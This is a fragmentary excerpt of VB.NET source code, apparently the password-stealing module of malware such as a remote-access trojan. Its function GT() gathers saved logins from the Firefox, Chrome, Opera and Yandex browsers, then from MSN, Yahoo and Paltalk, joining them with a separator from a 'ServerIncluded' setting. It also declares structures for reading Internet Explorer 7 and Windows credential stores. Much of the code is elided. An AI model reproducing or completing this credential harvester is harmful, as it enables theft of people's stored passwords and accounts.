...
Public Class PW
    ...
    Public Shared Function GT() As String
        ...
        FireFox()
        OL += ServerIncluded.splitalt
        Chrome.chromium(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Google\Chrome\User Data\Default\Login Data")
        OL += ServerIncluded.splitalt
        Chrome.chromium(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Opera Software\Opera Stable\Login Data")
        OL += ServerIncluded.splitalt
        Chrome.chromium(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Yandex\YandexBrowser\User Data\Default\Login Data")
        OL += ServerIncluded.splitalt
        Msn()
        OL += ServerIncluded.splitalt
        Yahoo()
...
#End Region
    ...
    Sub Paltalk()
        Try
            ...
            Dim ser() As Char = PW.HWD.ToCharArray
...
Module Chrome
    ...
    Sub chromium(ByVal datapath As String)
...
Friend Class CIE7Passwords
    ...
    Private Structure INTERNET_CACHE_ENTRY_INFO
        ...
        Dim LastModifiedTime As ComTypes.FILETIME
        Dim ExpireTime As ComTypes.FILETIME
        Dim LastAccessTime As ComTypes.FILETIME
        Dim LastSyncTime As ComTypes.FILETIME
    ...
    Private Structure StringIndexEntry
        ...
        Dim ftInsertDateTime As ComTypes.FILETIME 'date d'ajout de la donnée dans la liste pour le formulaire ou le champ
    ...
    Private Structure CREDENTIAL
        ...
        Dim ftLastWritten As ComTypes.FILETIME
